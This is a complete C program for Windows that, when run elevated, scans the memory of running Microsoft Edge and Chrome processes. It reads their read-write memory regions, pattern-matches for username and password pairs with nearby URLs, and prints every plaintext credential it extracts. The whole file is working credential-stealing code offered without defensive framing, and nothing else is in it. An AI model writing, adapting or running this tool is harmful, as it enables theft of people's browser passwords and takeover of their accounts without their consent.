#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ctype.h>

// -------------------------------------------------------------------
//  Credential storage
// -------------------------------------------------------------------
typedef struct {
    DWORD pid;
    char* owner;
    char* browser;
    char* username;
    char* password;
    char* url;
} Credential;

static Credential* credentials = NULL;
static int credCount = 0;
static int credCapacity = 0;

static void AddCredential(DWORD pid, const char* owner, const char* browser,
                          const char* username, const char* password, const char* url) {
    if (credCount >= credCapacity) {
        credCapacity = credCapacity ? credCapacity * 2 : 16;
        credentials = (Credential*)realloc(credentials, credCapacity * sizeof(Credential));
    }
    credentials[credCount].pid = pid;
    credentials[credCount].owner = _strdup(owner);
    credentials[credCount].browser = _strdup(browser);
    credentials[credCount].username = _strdup(username);
    credentials[credCount].password = _strdup(password);
    credentials[credCount].url = url ? _strdup(url) : _strdup("(not found)");
    credCount++;
}

// -------------------------------------------------------------------
//  Utility: check if running elevated
// -------------------------------------------------------------------
static bool IsElevated(void) {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, dwSize, &dwSize))
            fRet = Elevation.TokenIsElevated;
        CloseHandle(hToken);
    }
    return fRet;
}

// -------------------------------------------------------------------
//  Get process owner (domain\user)
// -------------------------------------------------------------------
static char* GetProcessOwner(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProcess) return _strdup("UNKNOWN");

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return _strdup("UNKNOWN");
    }

    DWORD dwSize = 0;
    char buffer[256] = {0};
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        TOKEN_USER* ptu = (TOKEN_USER*)malloc(dwSize);
        if (ptu && GetTokenInformation(hToken, TokenUser, ptu, dwSize, &dwSize)) {
            SID_NAME_USE snu;
            char name[128], domain[128];
            DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
            if (LookupAccountSidA(NULL, ptu->User.Sid, name, &nameLen, domain, &domainLen, &snu))
                snprintf(buffer, sizeof(buffer), "%s\\%s", domain, name);
            else
                strcpy_s(buffer, sizeof(buffer), "UNKNOWN");
        }
        free(ptu);
    }
    CloseHandle(hToken);
    CloseHandle(hProcess);
    return _strdup(buffer);
}

// -------------------------------------------------------------------
//  Strip domain prefix (keep only user name)
// -------------------------------------------------------------------
static void StripDomainPrefix(char* owner) {
    char* p = strchr(owner, '\\');
    if (p) memmove(owner, p + 1, strlen(p + 1) + 1);
}

// -------------------------------------------------------------------
//  Debug print (optional – keep for troubleshooting)
// -------------------------------------------------------------------
static void DebugPrintBytes(const unsigned char* buffer, size_t offset, size_t size) {
    size_t start = offset > 16 ? offset - 16 : 0;
    size_t end = offset + size + 16;
    printf("DBG bytes @%zu size=%zu from %zu to %zu:\n", offset, size, start, end);
    for (size_t j = start; j < end; j++) printf(" %02X", buffer[j]);
    printf("\nDBG ascii @%zu:\n", offset);
    for (size_t j = start; j < end; j++) {
        unsigned char c = buffer[j];
        putchar(c >= 0x20 && c <= 0x7E ? c : '.');
    }
    printf("\n");
}

// -------------------------------------------------------------------
//  Get root browser processes (skip children where parent is same browser)
// -------------------------------------------------------------------
typedef struct {
    DWORD pid;
    char* name;
    char* owner;
} ProcessInfo;

static ProcessInfo* GetBrowserProcesses(const char* targetExe, int* outCount) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        *outCount = 0;
        return NULL;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    ProcessInfo* list = NULL;
    int capacity = 0, count = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, targetExe) == 0) {
                // Check parent – skip if parent is also the same browser
                HANDLE hParentSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                BOOL parentIsSame = FALSE;
                if (hParentSnap != INVALID_HANDLE_VALUE) {
                    PROCESSENTRY32 parentPe;
                    parentPe.dwSize = sizeof(PROCESSENTRY32);
                    if (Process32First(hParentSnap, &parentPe)) {
                        do {
                            if (parentPe.th32ProcessID == pe.th32ParentProcessID &&
                                _stricmp(parentPe.szExeFile, targetExe) == 0) {
                                parentIsSame = TRUE;
                                break;
                            }
                        } while (Process32Next(hParentSnap, &parentPe));
                    }
                    CloseHandle(hParentSnap);
                }
                if (parentIsSame) continue;   // skip child process

                if (count >= capacity) {
                    capacity = capacity ? capacity * 2 : 8;
                    list = (ProcessInfo*)realloc(list, capacity * sizeof(ProcessInfo));
                }
                list[count].pid = pe.th32ProcessID;
                list[count].name = _strdup(pe.szExeFile);
                list[count].owner = GetProcessOwner(pe.th32ProcessID);
                count++;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    *outCount = count;
    return list;
}

// -------------------------------------------------------------------
//  Character classes for credentials (same as Edge)
// -------------------------------------------------------------------
static bool IsUsernameChar(unsigned char c) {
    if (isalnum(c)) return true;
    if (c == '-' || c == '_' || c == '.' || c == '@' || c == '?') return true;
    if (c >= 0x80) return true;
    return false;
}

static bool IsPasswordChar(unsigned char c) {
    if (isalnum(c)) return true;
    static const char* punct = "#!@$%^&*()_+-={}[]:;<>?/~'";
    if (strchr(punct, c)) return true;
    if (c == ' ') return true;
    if (c >= 0x80) return true;
    return false;
}

static bool IsUrlChar(unsigned char c) {
    if (isalnum(c)) return true;
    static const char* allowed = "-._~:/?#[]@!$&'()*+,;=%";
    return strchr(allowed, c) != NULL;
}

// -------------------------------------------------------------------
//  Extract URL before credential (look for three nulls then URL)
// -------------------------------------------------------------------
static char* FindUrlBefore(const unsigned char* buffer, size_t bufSize, size_t matchStart) {
    size_t searchStart = (matchStart > 4096) ? matchStart - 4096 : 0;
    for (size_t i = matchStart; i > searchStart; ) {
        i--;
        if (i + 2 < matchStart && buffer[i] == 0 && buffer[i + 1] == 0 && buffer[i + 2] == 0) {
            size_t urlStart = i + 3;
            if (urlStart >= matchStart) continue;
            size_t urlLen = 0;
            while (urlStart + urlLen < matchStart && urlLen < 512 && IsUrlChar(buffer[urlStart + urlLen]))
                urlLen++;
            if (urlLen > 0) {
                char* url = (char*)malloc(urlLen + 1);
                if (url) {
                    memcpy(url, buffer + urlStart, urlLen);
                    url[urlLen] = '\0';
                    return url;
                }
            }
        }
    }
    return NULL;
}

// -------------------------------------------------------------------
//  Scan a single memory region for credentials
// -------------------------------------------------------------------
static void ScanRegion(const unsigned char* buffer, size_t size, DWORD pid,
                       const char* owner, const char* browser,
                       int* totalMatches, int* shownMatches) {
    size_t i = 0;
    while (i < size) {
        // Look for "http " or "https "
        if (i + 5 <= size && memcmp(buffer + i, "http ", 5) == 0) {
            i += 5;
        } else if (i + 6 <= size && memcmp(buffer + i, "https ", 6) == 0) {
            i += 6;
        } else {
            i++;
            continue;
        }

        size_t userStart = i;
        size_t userLen = 0;
        while (userStart + userLen < size && IsUsernameChar(buffer[userStart + userLen]) && userLen < 80)
            userLen++;
        if (userLen < 3 || userLen > 80) {
            // Debug: DebugPrintBytes(buffer, userStart, 32);
            continue;
        }
        if (userStart + userLen >= size || buffer[userStart + userLen] != ' ')
            continue;

        size_t passStart = userStart + userLen + 1;
        size_t passLen = 0;
        while (passStart + passLen < size && passLen < 80) {
            unsigned char c = buffer[passStart + passLen];
            if (c == ' ') break;
            if (!IsPasswordChar(c)) break;
            passLen++;
        }
        if (passLen < 6 || passLen > 80)
            continue;
        // Must be followed by space then null
        if (passStart + passLen >= size || buffer[passStart + passLen] != ' ') continue;
        if (passStart + passLen + 1 >= size || buffer[passStart + passLen + 1] != 0) continue;

        char username[81] = {0};
        char password[81] = {0};
        memcpy(username, buffer + userStart, userLen);
        memcpy(password, buffer + passStart, passLen);

        char* url = FindUrlBefore(buffer, size, userStart);
        AddCredential(pid, owner, browser, username, password, url);
        if (url) free(url);

        (*totalMatches)++;
        (*shownMatches)++;
        i = passStart + passLen + 2;
    }
}

// -------------------------------------------------------------------
//  Scan all processes of a given browser
// -------------------------------------------------------------------
static void ScanBrowser(const char* browserExe, const char* browserName,
                        int* totalMatches, int* shownMatches) {
    int procCount = 0;
    ProcessInfo* procs = GetBrowserProcesses(browserExe, &procCount);
    if (!procs || procCount == 0) {
        printf("No %s processes found.\n", browserName);
        return;
    }
    printf("Found %d %s process(es) (excluding children).\n", procCount, browserName);

    for (int i = 0; i < procCount; i++) {
        DWORD pid = procs[i].pid;
        char* owner = procs[i].owner;
        char cleanOwner[256];
        strcpy(cleanOwner, owner);
        StripDomainPrefix(cleanOwner);
        printf("  Scanning PID %u (%s) owner %s\n", pid, procs[i].name, cleanOwner);
        fflush(stdout);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (!hProcess) {
            printf("    Failed to open process\n");
            continue;
        }

        unsigned char* address = 0;
        MEMORY_BASIC_INFORMATION mbi;
        while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi)) != 0) {
            if (mbi.State == MEM_COMMIT && mbi.Protect == PAGE_READWRITE && mbi.RegionSize > 0) {
                SIZE_T regionSize = (SIZE_T)mbi.RegionSize;
                if (regionSize > 1024 * 1024 * 1024) regionSize = 1024 * 1024 * 1024;
                unsigned char* buffer = (unsigned char*)malloc(regionSize);
                if (buffer) {
                    SIZE_T bytesRead = 0;
                    if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer, regionSize, &bytesRead))
                        ScanRegion(buffer, bytesRead, pid, owner, browserName,
                                   totalMatches, shownMatches);
                    free(buffer);
                }
            }
            address = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
        }
        CloseHandle(hProcess);
    }

    // Cleanup process list
    for (int i = 0; i < procCount; i++) {
        free(procs[i].name);
        free(procs[i].owner);
    }
    free(procs);
}

// -------------------------------------------------------------------
//  Main
// -------------------------------------------------------------------
int main(void) {
    if (!IsElevated()) {
        printf("[x] Not running elevated\n");
        return 1;
    }
    printf("[v] Running elevated\n\n");

    int totalMatches = 0, shownMatches = 0;

    printf("=== Scanning Microsoft Edge ===\n");
    ScanBrowser("msedge.exe", "Edge", &totalMatches, &shownMatches);
    printf("\n");

    printf("=== Scanning Google Chrome ===\n");
    ScanBrowser("chrome.exe", "Chrome", &totalMatches, &shownMatches);
    printf("\n");

    // -------------------------------------------------------------------
    //  Print all found credentials at the end
    // -------------------------------------------------------------------
    printf("\n==================== CREDENTIALS FOUND ====================\n");
    for (int i = 0; i < credCount; i++) {
        printf("[%d] %s | PID: %u | Owner: %s\n",
               i+1, credentials[i].browser, credentials[i].pid, credentials[i].owner);
        printf("    Username: %s\n", credentials[i].username);
        printf("    Password: %s\n", credentials[i].password);
        printf("    URL: %s\n", credentials[i].url);
        printf("-----------------------------------------------------------\n");
    }
    printf("Total credentials extracted: %d\n", credCount);

    // Cleanup stored credentials
    for (int i = 0; i < credCount; i++) {
        free(credentials[i].owner);
        free(credentials[i].browser);
        free(credentials[i].username);
        free(credentials[i].password);
        free(credentials[i].url);
    }
    free(credentials);

    printf("Press Enter to exit...");
    getchar();
    return 0;
}